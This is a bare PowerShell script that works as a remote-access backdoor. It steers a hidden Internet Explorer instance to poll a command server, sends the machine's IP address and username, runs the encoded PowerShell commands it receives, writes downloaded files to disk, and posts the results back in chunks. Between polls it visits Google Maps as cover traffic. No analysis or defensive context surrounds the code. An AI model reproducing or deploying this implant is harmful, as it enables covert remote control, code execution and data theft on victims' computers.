$SRV = '';
$CHUNK_SIZE = 35000;

function enc {
  param($m);
  return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($m));
}

function get {
  param($ie, $k, $d);
  $x = enc $d;
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
  return $ie.document.lastchild.innertext;
}

function post {
  param($ie, $k, $d, $p);
  $x = enc $d;
  $e = New-Object System.Text.ASCIIEncoding;
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $e.GetBytes("d=$p"), $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
}

function run {
  param($s, $ie);
  $type = get $ie 'TxR' $s;
  if ($type -ne '0') {
    $col = 3;
    $buf = New-Object Collections.ArrayList;
    while (1) {
      $d = get $ie 'TxD' ($s + '|' + $col);
      if ($d -eq $null) {
        break;
      }
      $buf.add($d) | out-null;
      $col++;
    }
    post $ie  'Tx'  ($s + '|2') '0';
    if ($type -eq '@') {
      $xc = $buf -join '';
      $res = powershell.exe -nopr -noni -enc $xc;
      if ($res -eq $null) {
        $res = 'NULL';
      } else {
        $res = $res | out-string;
      }
    } else {
      [IO.file]::WriteAllBytes("$type", [Convert]::FromBase64String([String]::join('', $buf)));
      $res = 'NULL';
    }
    $col = 3;
    $idx = 0;
    while ($idx -le ($res.length - $CHUNK_SIZE)) {
      $x = enc $res.substring($idx, $CHUNK_SIZE);
      post $ie 'Rx' ($s + '|' + $col) $x;
      $idx += $CHUNK_SIZE;
      $col++;
    }
    $x = enc($res.substring($idx));
    post $ie 'Rx' ($s + '|' + $col) $x;
    post $ie 'Rx' ($s + '|2') '1';
  }
}

while (1) {
  try {
    $ie = new-object -com internetexplorer.application;
    $ie.visible = $false;
    $ie.silent = $true;
    $ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1};
    $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
    while (1) {
      run $s $ie;
      $ie.navigate('https://www.google.com/maps/', 14);
      $delay = Get-Random -InputObject 5, 10, 15;
      sleep -seconds $delay;
      $ie.stop();
    }
  } catch {
    taskkill.exe /f /im iexplore.exe;
    write-host $_;
  }
}
